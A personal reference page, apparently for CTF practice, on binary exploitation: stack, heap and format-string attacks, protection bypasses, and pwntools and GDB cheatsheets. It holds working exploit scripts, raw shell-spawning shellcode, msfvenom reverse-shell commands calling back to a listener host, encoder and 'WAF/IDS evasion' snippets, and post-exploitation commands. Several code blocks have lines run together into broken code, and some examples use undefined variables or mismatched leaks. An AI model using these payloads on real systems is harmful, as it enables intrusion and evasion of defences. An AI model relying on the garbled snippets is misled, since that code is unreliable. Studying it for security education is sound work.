---
title: Binary Exploitation
tags: [kernel system, Security Tools, notes]
description: exploiting memory corruption vulnerabilities
date: 2025-10-02
---

## PART 1: DETAILED REFERENCE NOTES

### 1. Core Concepts and Definitions

### What is Binary Exploitation?

Binary exploitation is the process of subverting a compiled application to violate trust boundaries by exploiting memory corruption vulnerabilities, allowing attackers to:
- Execute arbitrary code
- Elevate privileges
- Bypass security controls
- Gain unauthorized access

### Common Vulnerability Classes

**Buffer Overflows (Stack-Based)**
- Occur when a program writes data beyond the allocated buffer boundary
- Overwrites adjacent memory (local variables, saved base pointer, return address)
- Most common in C/C++ due to lack of automatic bounds checking
- Vulnerable functions: `strcpy`, `gets`, `sprintf`, `scanf`, `strcat`, `read`

**Heap Exploitation**
- **Use-After-Free (UAF)**: Memory is accessed after being freed, potentially allowing arbitrary code execution
- **Double-Free**: Freeing the same memory block twice, corrupting the heap allocator’s metadata
- **Heap Overflow**: Similar to stack overflow but targets heap-allocated memory

**Format String Vulnerabilities**
- Occur when user input is passed directly as format argument to `printf`, `sprintf`, etc.
- Allow reading/writing arbitrary memory locations
- Format specifiers: `%x` (read stack), `%s` (read strings), `%n` (write integers)

**Return-Oriented Programming (ROP)**
- Advanced technique using existing code snippets (“gadgets”) ending in `ret`
- Chains gadgets together to perform arbitrary operations
- Bypasses non-executable memory protections (DEP/NX)

**Return-to-libc (ret2libc)**
- Subset of ROP targeting libc functions (especially `system()`)
- Doesn’t require shellcode injection
- Common target: `system("/bin/sh")`

---

### 2. Attack Methodology Overview (Kill-Chain)

### Phase 1: Reconnaissance & Enumeration

1. **File Analysis**
    - Determine file type, architecture, and format
    - Identify statically vs dynamically linked binaries
    - Check for debug symbols
2. **Security Analysis**
    - Enumerate active protections (RELRO, Stack Canaries, NX, PIE, ASLR)
    - Identify potential attack surfaces
    - Map available functions and libraries
3. **Static Analysis**
    - Reverse engineer binary logic
    - Identify vulnerable code paths
    - Locate useful functions/gadgets
    - Analyze control flow graphs
4. **Dynamic Analysis**
    - Debug and observe runtime behavior
    - Fuzz inputs to trigger crashes
    - Identify crash offsets and control points

### Phase 2: Exploitation Development

1. **Vulnerability Confirmation**
    - Trigger the vulnerability reliably
    - Calculate precise offsets (buffer to return address)
    - Verify instruction pointer control
2. **Protection Bypass**
    - Leak addresses if ASLR/PIE enabled
    - Leak or brute-force stack canaries
    - Build ROP chains for NX bypass
    - Identify writable GOT entries for RELRO bypass
3. **Payload Construction**
    - Generate shellcode or ROP chain
    - Ensure payload meets constraints (bad chars, size limits)
    - Account for architecture-specific calling conventions
4. **Exploit Delivery**
    - Craft final payload with proper structure
    - Test locally before remote deployment
    - Adjust for timing/reliability issues

### Phase 3: Post-Exploitation

1. Spawn interactive shell
2. Escalate privileges if needed
3. Read flags or exfiltrate data
4. Establish persistence (CTF: usually not required)

---

### 3. Memory Protections & Bypasses

### ASLR (Address Space Layout Randomization)

**Purpose**: Randomizes base addresses of stack, heap, libraries
**Status Check**: `cat /proc/sys/kernel/randomize_va_space` (0=disabled, 2=full)
**Bypass Techniques**:
- **Information Leak**: Use format strings, buffer over-reads, or other vulnerabilities to leak addresses
- **Brute Force**: Only feasible on 32-bit systems with limited entropy
- **Partial Overwrite**: Overwrite only least significant bytes that aren’t randomized
- **ret2plt**: Use PLT stubs which have fixed offsets from binary base

### DEP/NX (Data Execution Prevention / No-eXecute)

**Purpose**: Marks stack/heap as non-executable
**Check**: `checksec` shows “NX enabled”
**Bypass Techniques**:
- **ROP Chains**: Execute existing code snippets
- **ret2libc**: Return to libc functions instead of injecting shellcode
- **mprotect**: Use ROP to call `mprotect()` to mark memory executable

### Stack Canaries

**Purpose**: Random value placed before return address to detect overwrites
**Check**: `checksec` shows “Canary found”
**Implementation**: Value placed at `[rbp-8]`, checked before function return
**Bypass Techniques**:
- **Canary Leak**: Use format string or over-read to leak canary value
- **Partial Overwrite**: Avoid overwriting canary entirely
- **Brute Force**: Feasible for forking services (canary remains same across forks)
- **Stack Pivot**: Redirect stack pointer away from canary

### PIE (Position Independent Executable)

**Purpose**: Randomizes binary base address
**Check**: `checksec` shows “PIE enabled”
**Bypass Techniques**:
- **Leak Binary Address**: Any code address leak reveals base
- **Relative Jumps**: Use relative offsets which remain constant
- **Partial Overwrite**: Target nearby functions in same page

### RELRO (Relocation Read-Only)

**Purpose**: Makes GOT read-only to prevent overwrites
**Partial RELRO**: GOT placed before BSS (default in GCC)
**Full RELRO**: Entire GOT made read-only after startup
**Bypass Techniques**:
- **Partial RELRO**: GOT still writable, format string attacks work
- **Full RELRO**: Target other function pointers (`__malloc_hook`, `__free_hook`, exit handlers)
- **libc GOT/PLT**: Target libc’s internal GOT (glibc 2.35) if accessible

---

### 4. Tool Setup and Configuration

### Essential Tools

**Debuggers**
- **GDB with Plugins**:
- **pwndbg**: `git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh`
- **GEF**: `wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py && echo source ~/.gdbinit-gef.py >> ~/.gdbinit`
- **PEDA**: `git clone https://github.com/longld/peda.git ~/peda && echo "source ~/peda/peda.py" >> ~/.gdbinit`

**Disassemblers/Decompilers**
- **Ghidra**: Free NSA reverse engineering tool with decompiler
- **IDA Pro/Free**: Industry standard disassembler
- **Binary Ninja**: Modern commercial alternative
- **radare2/rizin**: Open-source reverse engineering framework

**Exploitation Frameworks**
- **pwntools**: `pip install pwntools` (Python library for exploit development)
- **ROPgadget**: `pip install ropgadget` (Find ROP gadgets)
- **ropper**: `pip install ropper` (Alternative gadget finder)
- **one_gadget**: `gem install one_gadget` (Find one-shot RCE gadgets in libc)

**Analysis Tools**
- **checksec**: `sudo apt install checksec` (Check binary protections)
- **file**: Built-in Linux tool for file type identification
- **strings**: Extract printable strings from binaries
- **ltrace/strace**: Trace library/system calls
- **objdump**: Disassemble and inspect ELF files

**Shellcode Generation**
- **msfvenom**: Part of Metasploit Framework
- **pwntools shellcraft**: Built-into pwntools

**Seccomp Analysis**
- **seccomp-tools**: `gem install seccomp-tools` (Dump and analyze seccomp filters)

---

### 5. In-Depth Exploitation Steps

### Stack-Based Buffer Overflow (32-bit)

**Step 1: Identify Offset**

```bash
# Generate cyclic patterncyclic 200
# Run binary with pattern, note crash address# Find offsetcyclic -l 0x6161616c  # Returns offset (e.g., 44)
```

**Step 2: Verify Control**

```python
payload = b'A' * offset + p32(0xdeadbeef)
# EIP should be 0xdeadbeef
```

**Step 3: Craft Exploit (No Protections)**

```python
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"nop_sled = b"\x90" * 100payload = nop_sled + shellcode + b'A' * (offset - len(nop_sled) - len(shellcode))
payload += p32(buffer_address + 50)  # Jump into NOP sled
```

**Step 4: With NX Protection (ret2libc)**

```python
# Find addressessystem_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.symbols['exit']
# Build payload (32-bit)payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)  # Return address for systempayload += p32(binsh_addr)  # Argument to system
```

### Stack-Based Buffer Overflow (64-bit)

**Key Difference**: x86-64 calling convention uses registers for first 6 arguments
- RDI: 1st argument
- RSI: 2nd argument

- RDX: 3rd argument
- RCX: 4th argument
- R8: 5th argument
- R9: 6th argument

**Exploitation Steps**:

```python
# Find gadgetspop_rdi = 0x4011cb  # pop rdi; ret# Build payloadpayload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Format String Exploitation

**Reading Memory**

```python
# Read stack valuespayload = b"%x " * 20  # Dumps 20 stack values# Read specific offsetpayload = b"%7$llx"  # Read 7th argument (64-bit)payload = b"%7$x"    # Read 7th argument (32-bit)# Read string from addressaddr = 0x08048000payload = p32(addr) + b"%7$s"  # If format string is 7th arg
```

**Writing Memory**

```python
# Write to GOT entrytarget_addr = elf.got['puts']
value = 0x08048a2b  # Address to write# Calculate writes (32-bit example)low = value & 0xffffhigh = (value >> 16) & 0xffffpayload = p32(target_addr) + p32(target_addr + 2)
payload += f"%{low - 8}c%7$hn".encode()
payload += f"%{high - low}c%8$hn".encode()
```

### GOT/PLT Hijacking

**Understanding GOT/PLT**:
- **PLT (Procedure Linkage Table)**: Stubs that jump to GOT entries
- **GOT (Global Offset Table)**: Contains actual function addresses (resolved at runtime)
- **Lazy Binding**: Functions resolved on first call

**Exploitation**:

```python
# Overwrite GOT entrygot_puts = elf.got['puts']
system_addr = libc.symbols['system']
# Using format stringwrite_addr = got_puts
write_value = system_addr
# [format string payload to write system_addr to got_puts]# Next call to puts("/bin/sh") becomes system("/bin/sh")
```

### Heap Exploitation (Use-After-Free)

**Concept**: Exploit occurs when:
1. Memory is allocated and pointer is stored
2. Memory is freed
3. Memory is reallocated for different purpose
4. Original pointer is still used

**Exploitation**:

```python
# 1. Allocate object with function pointercreate_object("victim")
# 2. Free the objectdelete_object("victim")
# 3. Spray heap with controlled datafor i in range(100):
    create_object(f"spray_{i}", payload=p64(system_addr))
# 4. Use original pointer (now points to attacker data)use_object("victim")  # Calls system() instead
```

---

### 6. Defensive Indicators and Red Flags

**Signs of Active Protections**:
- Immediate crash after overflow (Stack Canary)
- Different addresses each run (ASLR/PIE)
- SIGSEGV when executing shellcode (NX)
- Segfault when writing to GOT (Full RELRO)
- Syscall restrictions (Seccomp)

**Debugging Protection Detection**:

```bash
# Check ASLRcat /proc/sys/kernel/randomize_va_space
# Check all protectionschecksec --file=./binary
# Check seccompseccomp-tools dump ./binary
# Manually check for canaries in disassembly# Look for: mov rax, QWORD PTR fs:0x28 (stack canary load)#           xor rax, QWORD PTR fs:0x28 (stack canary check)
```

---

### 7. Common Hurdles and Mitigation Bypasses

### Problem: ASLR Enabled, No Leak

**Solutions**:
- Look for format string vulnerability
- Check for information disclosure in error messages
- Examine any output that might contain addresses
- Partial overwrite attacks (last 12 bits not randomized on x64)

### Problem: Stack Canary, No Leak

**Solutions**:
- Look for fork-based servers (canary remains same)
- Use format string to leak canary
- Avoid overwriting canary (overflow non-return-address targets)
- Stack pivot to different stack region

### Problem: NX Enabled, Small Buffer

**Solutions**:
- Use ROP chains
- ret2libc with minimal gadgets
- Stack pivot to larger buffer
- Use one_gadget if constraints met

### Problem: Full RELRO (GOT Read-Only)

**Solutions**:
- Target glibc hooks: `__malloc_hook`, `__free_hook`, `__realloc_hook`
- Overwrite exit handlers in `.fini_array`
- Target file stream structures (`_IO_FILE`)
- Target libc’s internal GOT (glibc 2.35 only)

### Problem: Seccomp Sandbox

**Solutions**:
- ORW technique (open-read-write instead of execve)
- Check for improper filters (missing arch check, missing x32 check)
- Use allowed syscalls creatively
- retf to switch to x86 mode (if filter doesn’t check)

### Problem: No System/Libc Available

**Solutions**:
- Use `execve` syscall directly via ROP
- Use mprotect to make stack executable, then run shellcode
- sigreturn-oriented programming (SROP)

---

## PART 2: RAPID-REFERENCE CHEATSHEET

### ENUMERATION CHECKLIST

```bash
# File Analysis
file ./binary                     # Architecture, stripped, dynamically linked
strings ./binary                  # Embedded strings, hardcoded data
checksec --file=./binary          # Security mitigations

# Running Analysis
ltrace ./binary                   # Library call traces
strace ./binary                   # System call traces
seccomp-tools dump ./binary       # Seccomp filter rules

# Disassembly
objdump -d ./binary | less        # Full disassembly with paging
objdump -M intel -d ./binary      # Quick disassembly (Intel syntax)
rabin2 -I ./binary                # Binary info (radare2)

# Find Functions and Symbols
readelf -s ./binary               # Symbol table
nm ./binary                       # List symbols
objdump -tT ./binary | grep func  # Search for specific functions

```

### GDB COMMANDS (pwndbg/GEF)

```bash
# Starting GDB
gdb ./binary                      # Load binary
gdb -p $(pidof binary)            # Attach to running process
r < input.txt                     # Run with input file
r $(python -c 'print("A"*100)')   # Run with inline input

# Breakpoints
b main                            # Break at main
b *0x08048484                     # Break at address
info breakpoints                  # List breakpoints
delete 1                          # Delete breakpoint 1

# Examining Memory
x/20x $rsp                        # Examine 20 hex words from RSP
x/20gx $rsp                       # Examine 64-bit words
x/s 0x08048000                    # Examine string
x/i $rip                          # Examine instruction

# Registers (pwndbg)
registers                         # Show all registers
info registers                    # GDB default

# Execution Control
ni                                # Next instruction (step over)
si                                # Step instruction (step into)
c                                 # Continue execution
finish                            # Run until return

# pwndbg Specific
cyclic 200                        # Generate pattern
cyclic -l 0x61616162              # Find offset
vmmap                             # Show memory mappings
search -s "/bin/sh"               # Search for string
rop                               # Find ROP gadgets (limited)
distance $rsp $rbp                # Calculate stack distance

# Setting Arguments & Memory
set args AAAA                     # Set command-line arguments
set {int}0x8048000 = 0x41414141   # Write value to memory

```

### PWNTOOLS TEMPLATE

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.update(arch='amd64', os='linux')
context.log_level = 'debug'        # or 'info', 'warn'
context.terminal = ['tmux', 'splitw', '-h']

# Binary setup
exe = ELF('./binary')
libc = ELF('./libc.so.6')          # If provided
rop = ROP(exe)

# Connection setup
def conn():
    if args.REMOTE:
        return remote('target.com', 1337)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript='''
            b main
            continue
        ''')
    else:
        return process([exe.path])

# Start exploit
p = conn()

# Receive/Send example
p.recvuntil(b'Enter input: ')
p.sendline(payload)
p.recvline()
data = p.recv(1024)

# Packing
payload = p32(0xdeadbeef)                  # 32-bit
payload = p64(0xdeadbeefcafe)              # 64-bit
payload = flat([
    0x41414141,
    0x42424242,
    p64(0x43434343)
])

# Unpacking
addr = u32(data[:4])
addr = u64(data.ljust(8, b'\x00'))         # Pad if needed

# Common Functions
payload = cyclic(200)
offset = cyclic_find(0x6161616c)

# ELF Symbols
main_addr = exe.symbols['main']
got_puts  = exe.got['puts']
plt_puts  = exe.plt['puts']

# Libc Functions
system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))

# ROP Building
rop = ROP(exe)
rop.call('puts', [exe.got['puts']])
rop.call('main')
payload = fit({offset: rop.chain()})

# Shellcode examples
shellcode = asm(shellcraft.sh())
shellcode = asm("""
    xor rax, rax
    push rax
    push 0x68732f2f
    push 0x6e69622f
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    mov al, 59
    syscall
""")

# Interactive mode
p.interactive()

```

### GADGET FINDING

```bash
	# ROP Gadgets with ROPgadget
ROPgadget --binary ./binary                 # Find all gadgets in binary
ROPgadget --binary ./binary | grep "pop rdi"  # Find "pop rdi" gadgets
ROPgadget --binary ./binary --ropchain     # Auto-generate a ROP chain

# ROP Gadgets with Ropper
ropper --file ./binary                      # Interactive mode to explore gadgets
ropper --file ./binary --search "pop rdi"  # Search for "pop rdi" gadgets
ropper --file ./binary --chain "execve"    # Auto ROP chain for execve

# ROP Gadgets with pwntools
python3 -c "from pwn import *; r = ROP('./binary'); print(r.dump())"   # Dump gadgets with pwntools

# ROP Gadgets with radare2
r2 ./binary                               # Open radare2 interactive shell
/R pop rdi                               # Search for "pop rdi" gadget in radare2

# One Gadget (libc Remote Code Execution)
one_gadget /lib/x86_64-linux-gnu/libc.so.6     # Find one-gadget offsets in libc
one_gadget --level 1 libc.so.6                  # Filter gadgets by perm level (e.g., 1)

```

### SHELLCODE GENERATION

```bash
# pwntools Shellcode Generation
python3 -c "from pwn import *; context.arch='amd64'; print(shellcraft.sh())"              # Generate amd64 shell spawn shellcode (assembly)
python3 -c "from pwn import *; context.arch='i386'; print(asm(shellcraft.sh()).hex())"    # Generate i386 shell spawn shellcode (hex bytes)

# msfvenom Shellcode (Linux x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python          # Reverse TCP shell - python format
msfvenom -p linux/x64/exec CMD="/bin/sh" -f c -b '\x00\x0a\x0d'                         # Exec shell avoiding bad chars

# msfvenom Shellcode (Linux x86)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python           # x86 reverse TCP shellcode in python format

# msfvenom Shellcode (Windows x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe   # Generate Windows x64 reverse shell exe

# msfvenom with Encoder (evade bad chars)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 3

# Extract shellcode from objdump (manual)
as shell.s -o shell.o                                 # Assemble shellcode source to object
ld shell.o -o shell                                   # Link object to executable shell
objdump -d shell | grep '[0-9a-f]:' | grep -v 'file' \
  | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
  | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s           # Extract raw shellcode bytes

```

### COMMON PAYLOADS

```python
# Basic buffer overflow (32-bit, no protections)
payload = b'A' * offset + p32(shellcode_addr)

# ret2win (jump to a winning function)
payload = b'A' * offset + p64(win_function_addr)

# ret2libc (32-bit)
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)

# ret2libc (64-bit)
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

# ret2plt (leaking libc address by calling puts from GOT)
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])  # Return to main for program loop

# Format string exploit (leaking canary)
payload = b"%15$p"   # Canary at 15th offset (example)

# Format string exploit (GOT overwrite)
payload = p32(got_target) + p32(got_target + 2)
payload += b"%123c%7$hn%234c%8$hn"  # Write split 4-byte value in two halves

# One-gadget RCE (glibc)
payload = b'A' * offset + p64(libc_base + one_gadget_offset)

```

### DECISION TREE

```
Buffer Overflow Detected?
├─ No Protections?
│  └─ Use shellcode injection → NOP sled + shellcode + return to buffer
├─ NX Enabled?
│  ├─ Libc available?
│  │  └─ Use ret2libc → pop_rdi; binsh; system
│  └─ No libc?
│     └─ Use syscall ROP → execve ROP chain
├─ ASLR Enabled?
│  ├─ Leak available?
│  │  └─ Leak libc → Calculate offsets → ret2libc/ROP
│  └─ No leak?
│     └─ Try partial overwrite / brute force (32-bit only)
├─ Stack Canary?
│  ├─ Format string available?
│  │  └─ Leak canary → Include in overflow payload
│  └─ Forking server?
│     └─ Brute force canary byte-by-byte
├─ PIE Enabled?
│  └─ Leak any code address → Calculate base → Continue exploit
└─ Full RELRO?
   └─ Target hooks (__malloc_hook, __free_hook) or other pointers

Format String Detected?
├─ Read arbitrary memory?
│  └─ Use %s or %x to leak addresses (stack, libc, PIE base, canary)
├─ Write arbitrary memory?
│  ├─ Partial RELRO?
│  │  └─ Overwrite GOT entry → Redirect function
│  └─ Full RELRO?
│     └─ Overwrite __malloc_hook or exit handler
└─ No obvious path?
   └─ Leak addresses first → Plan next stage

Heap Exploit Detected?
├─ UAF vulnerability?
│  └─ Free object → Reallocate with controlled data → Trigger use
├─ Double-Free?
│  └─ Poison tcache → Allocate to arbitrary address
└─ Heap Overflow?
   └─ Overwrite metadata → Trigger allocation/free → Exploit
```

### LIBC DATABASE

```bash
# Find libc version online

## Method 1: Online Libc databases
- Use https://libc.blukat.me or https://libc.rip
- Provide leaked runtime addresses of known functions like printf, puts, or __libc_start_main
- They help identify exact libc version and offsets

## Method 2: Local libc-database tool
git clone https://github.com/niklasb/libc-database.git
cd libc-database
./get                           # Download various libc versions

# Search for a libc version from leaked function address
./find printf 0x7f0             # Example: provide leaked 'printf' address prefix

# Dump symbols of an identified libc
./dump libc6_2.27-3ubuntu1_amd64

# Using pwntools LibcSearcher for automation
from pwn import *
libc = LibcSearcher('puts', puts_addr)       # Provide known function name and leaked address
system_addr = libc.dump('system')             # Get system offset/address in libc

```

### WAF/IDS EVASION

```python
from pwn import *

# Encode cyclic pattern with 8-byte sequences (useful for 64-bit)
encoded = cyclic(100, n=8)

# Timing delays before sending payload to avoid crashes or detection
import time
time.sleep(0.5)
p.sendline(payload)

# Fragment payload by sending one byte at a time, with small delay between bytes
for byte in payload:
    p.send(bytes([byte]))
    time.sleep(0.01)

# NOP sled variations for x86/x64 architectures (alternative NOP instructions)
nops = b'\x90\x91\x96\x97\x98\x99'  # Classic NOP plus alternatives for evasion

# Shellcode encoding (commonly done with msfvenom encoders)
# Examples: shikata_ga_nai, alpha_mixed, etc., to evade bad char filters or detection

```

### POST-EXPLOITATION SHORTCUTS

```bash
# Upgrade shell to fully interactive with Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# After Ctrl-Z (to background), fix terminal settings
stty raw -echo; fg
export TERM=xterm

# Find flag files by name, ignoring permission errors
find / -name flag.txt 2>/dev/null
find / -name 'flag*' 2>/dev/null

# Search recursively for flag patterns in files
grep -r "flag{" / 2>/dev/null

# ORW file reading when execve is blocked (in C or scripting)
fd = open("/flag.txt", O_RDONLY)
read(fd, buffer, 100)
write(1, buffer, 100)

# Read commonly useful proc files
cat /proc/self/maps           # Current memory mappings
cat /proc/self/environ        # Environment variables of current process

```

### COMMON PITFALLS

```python
# 1. WRONG ENDIANNESS
# Bad:
payload = b'\x12\x34\x56\x78'
# Good (little-endian):
payload = p32(0x78563412)

# 2. MISSING NULL TERMINATOR HANDLING
# Bad:
binsh = b'/bin/sh'
# Good:
binsh = b'/bin/sh\x00'

# 3. ALIGNMENT ISSUES (x64)
# Some instructions require 16-byte stack alignment
# Add extra 'ret' gadget if needed:
payload += p64(ret_gadget)
payload += p64(system_addr)

# 4. FORGETTING TO FLUSH BUFFERS
p.sendline(payload)
p.clean()  # Receive all pending output

# 5. BAD CHARACTERS NOT REMOVED
# Check what characters terminate input: \x00, \x0a, \x0d, \x20
# Use msfvenom -b option or manual encoding

# 6. WRONG CALLING CONVENTION
# 32-bit: arguments on stack
# 64-bit: RDI, RSI, RDX, RCX, R8, R9, then stack

# 7. NOT SETTING CONTEXT
context.arch = 'amd64'
context.os = 'linux'

```

---

## PART 3: REAL-WORLD EXAMPLES & USAGE SCENARIOS

### Example 1: Basic Stack Overflow (HTB/THM)

**Scenario**: 32-bit binary, no protections, accepts 512 bytes input

```bash
# 1. Check binary protections
checksec ./binary
# Example Result:
# CANARY    : No
# NX        : Disabled
# PIE       : No
# RELRO     : No

# 2. Find offset in GDB
gdb ./binary
(gdb) run $(cyclic 200)
# After crash, note the overwritten value (e.g., 0x6161616c)
# Exit gdb and find offset:
cyclic -l 0x6161616c
# Output:
# 112

```

```python
from pwn import *

# Start process
p = process('./binary')

# Set architecture for assembling shellcode
context.arch = 'i386'

# Offset found from cyclic pattern / crash analysis
offset = 112

# Generate shellcode (spawn shell)
shellcode = asm(shellcraft.sh())

# Create a NOP sled (padding before shellcode)
nop_sled = b'\x90' * 100

# Buffer address found from GDB examining stack pointer (example)
buffer_addr = 0xffffcf40

# Build payload
payload = nop_sled + shellcode
payload += b'A' * (offset - len(payload))            # Padding to reach return address
payload += p32(buffer_addr + 50)                     # Overwrite RET with address in NOP sled

# Send payload and interact
p.sendline(payload)
p.interactive()

```

### Example 2: ret2libc with ASLR Bypass

**Scenario**: 64-bit binary, NX + ASLR enabled, format string leak available

```python
from pwn import *

exe = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# Stage 1: Leak libc address
p.recvuntil(b'Name: ')
p.sendline(b'%3$p')  # Leak stack address
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked address: {hex(leak)}")

# Calculate libc base (adjust offset based on the leaked address)
libc_base = leak - 0x21b97  # Example offset, adjust per actual leak
libc.address = libc_base
log.info(f"Libc base address: {hex(libc_base)}")

# Stage 2: Overflow with ret2libc
offset = 40
pop_rdi = 0x401234          # Replace with actual gadget address found by ROPgadget
ret = 0x40101a              # Ret gadget for stack alignment if needed

payload = b'A' * offset
payload += p64(ret)         # Align stack to 16 bytes before call
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))   # Address of "/bin/sh" string in libc
payload += p64(libc.symbols['system'])          # Address of system()

p.sendline(payload)
p.interactive()

```

### Example 3: GOT Overwrite via Format String

**Scenario**: Format string vulnerability, partial RELRO

```python
from pwn import *

exe = ELF('./vuln')
p = process('./vuln')

# Find format string offset
for i in range(1, 20):
    p.sendline(f'AAAA%{i}$p'.encode())
    result = p.recvline()
    if b'41414141' in result:  # 'AAAA' in hex
        log.info(f"Format string offset found at: {i}")
        offset = i
        break

# Example offset found (adjust if needed)
offset = 6

# Target: Overwrite puts@GOT with win function address
target = exe.got['puts']
value = exe.symbols['win']

# Split value into lower and upper 2 bytes for writing
low_bytes = value & 0xffff
high_bytes = (value >> 16) & 0xffff

# Craft payload to write lower bytes, then upper bytes
payload = p32(target) + p32(target + 2)
payload += f'%{low_bytes - 8}c%{offset}$hn'.encode()
payload += f'%{high_bytes - low_bytes}c%{offset + 1}$hn'.encode()

# Send payload and get interactive shell or response
p.sendline(payload)
p.interactive()

```

### Example 4: Seccomp ORW Bypass

**Scenario**: Seccomp blocks execve, allows open/read/write

```python
from pwn import *

context.arch = 'amd64'
exe = ELF('./vuln')
p = process('./vuln')

# Assume these addresses are known/found via static/dynamic analysis
flag_string_addr = 0x404050      # Address of "/flag.txt" string in memory
buffer_addr = 0x404200           # Writable buffer for reading file contents
offset = 40                     # Offset to return address from buffer start

rop = ROP(exe)

# open("/flag.txt", O_RDONLY)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(flag_string_addr)
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(0)                       # O_RDONLY = 0
rop.raw(exe.plt['open'])

# read(3, buffer, 100)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(3)                       # file descriptor returned by open
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(buffer_addr)             # buffer address
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(100)                    # number of bytes to read
rop.raw(exe.plt['read'])

# write(1, buffer, 100)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(1)                      # stdout
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(buffer_addr)            # buffer address
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(100)                   # number of bytes to write
rop.raw(exe.plt['write'])

# Build complete payload with offset
payload = b'A' * offset + rop.chain()

p.sendline(payload)
print(p.recvall())

```

### Example 5: Heap UAF Exploitation

**Scenario**: Use-after-free in user management system

```python
from pwn import *

p = process('./heap_vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create_user(name, desc):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Name: ', name)
    p.sendlineafter(b'Desc: ', desc)

def delete_user(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def view_user(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

# Trigger Use-After-Free (UAF)
create_user(b'victim', b'AAAA')  # Create user 0
delete_user(0)                   # Free user 0

# Heap spray with function pointers pointing to win()
for i in range(10):
    create_user(b'spray', p64(exe.symbols['win']))

# Use the freed user 0 object, which now should use sprayed pointer and call win()
view_user(0)

p.interactive()

```

---

## PART 4: APPLICATION GUIDANCE

### Using This Cheatsheet Under Time Pressure

**Quick Start (First 60 seconds)**:
1. Run `checksec ./binary` - Note enabled protections
2. Run `file ./binary` - Note architecture (x86/x64)
3. Run `strings ./binary | grep -i flag` - Quick wins
4. Open in GDB/Ghidra simultaneously

**Exploit Development Flow**:
1. **Crash it first**: Use `cyclic(500)` to trigger and find offset
2. **Verify control**: Send `b'A' * offset + p64(0xdeadbeef)` and confirm
3. **Check decision tree**: Match your scenario to appropriate technique
4. **Build incrementally**: Test each stage (leak → calculate → exploit)
5. **Debug locally**: Always test local before remote

**Switching Between Enumeration and Exploitation**:
- **Keep two terminals open**: One for GDB, one for exploit script
- **Use tmux/screen**: Split view for real-time debugging
- **pwntools context switching**: Use `if args.GDB:` for easy toggling
- **Save intermediate payloads**: Log successful stages before continuing

### Customizing Payloads for Unusual Targets

**Non-standard calling conventions**:

```python
# Check disassembly for actual convention used# Some binaries use fastcall, thiscall, etc.# Adjust register order accordingly
```

**Bad character restrictions**:

```python
# Identify bad chars through testingbad_chars = b'\x00\x0a\x0d\x20'# Use encodershellcode = asm(shellcraft.sh())
encoded = encode(shellcode, avoid=bad_chars)
# Or use alphanumeric shellcodecontext.encoder = 'alpha_mixed'
```

**Size constraints**:

```python
# Use one_gadget instead of full ROP chainone_gadget = libc_base + 0xe3afe# Or minimal shellcodeshellcode = asm('push 0x68; pop rax; syscall')  # Minimal example
```

**Alternative architectures (ARM, MIPS)**:

```python
context.arch = 'arm'context.bits = 32# Adjust gadgets and calling convention accordingly
```

### Quick Reference Card (Print/Second Monitor)

```
╔══════════════════════════════════════════════════════════════════╗
║                    BINARY EXPLOITATION                           ║
╠══════════════════════════════════════════════════════════════════╣
║ ENUMERATION:                                                     ║
║  file → checksec → strings → objdump -d → ltrace/strace         ║
║                                                                  ║
║ GDB ESSENTIALS:                                                  ║
║  b *0xaddr | x/20gx $rsp | ni/si | cyclic | vmmap              ║
║                                                                  ║
║ PWNTOOLS CORE:                                                   ║
║  p64/p32 | u64/u32 | cyclic | flat | asm | shellcraft.sh()     ║
║  exe.plt/got/symbols | libc.symbols | rop.call()               ║
║                                                                  ║
║ COMMON GADGETS:                                                  ║
║  ROPgadget --binary x | grep "pop rdi"                          ║
║  one_gadget libc.so.6                                           ║
║                                                                  ║
║ PAYLOAD STRUCTURE (64-bit):                                     ║
║  [padding] + [pop rdi] + [arg1] + [pop rsi] + [arg2] + [func]  ║
